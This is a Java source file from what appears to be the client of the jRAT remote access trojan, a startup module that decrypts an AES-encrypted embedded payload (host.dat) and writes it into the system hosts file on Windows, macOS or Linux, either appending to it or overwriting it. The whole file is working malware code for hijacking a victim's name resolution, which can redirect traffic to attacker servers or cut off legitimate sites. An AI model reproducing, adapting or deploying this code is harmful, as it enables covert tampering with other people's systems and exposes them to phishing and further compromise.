package jrat.client.modules.startup;

import jrat.common.crypto.CryptoUtils;
import jrat.client.Configuration;
import jrat.client.Main;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.spec.SecretKeySpec;
import oslib.OperatingSystem;

public class HostFileStartupModule extends StartupModule {

	public HostFileStartupModule(Map<String, String> config) {
		super(config);
	}

	public void run() throws Exception {
		try {
			if (Configuration.getConfig().get("overwritehost") != null && getClass().getResourceAsStream("/host.dat") != null) {
				File file;

				if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
					file = new File(System.getenv("SystemDrive") + "\\Windows\\System32\\drivers\\etc\\hosts");
				} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.MACOS) {
					file = new File("/private/etc/hosts");
				} else {
					file = new File("/etc/hosts");
				}

				Cipher cipher = CryptoUtils.getBlockCipher(Cipher.DECRYPT_MODE, new SecretKeySpec(Configuration.getConfigKey(), "AES"), Configuration.getIV());
				InputStream is = new CipherInputStream(Main.class.getResourceAsStream("/host.dat"), cipher);
				BufferedReader reader = new BufferedReader(new InputStreamReader(is));

				boolean overwrite = Boolean.parseBoolean(Configuration.getConfig().get("overwritehost"));

				FileWriter writer = new FileWriter(file, overwrite);
				BufferedWriter out = new BufferedWriter(writer);

				String line;
				while ((line = reader.readLine()) != null) {
					out.write(line);
					out.newLine();
				}
				
				out.close();
				reader.close();
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
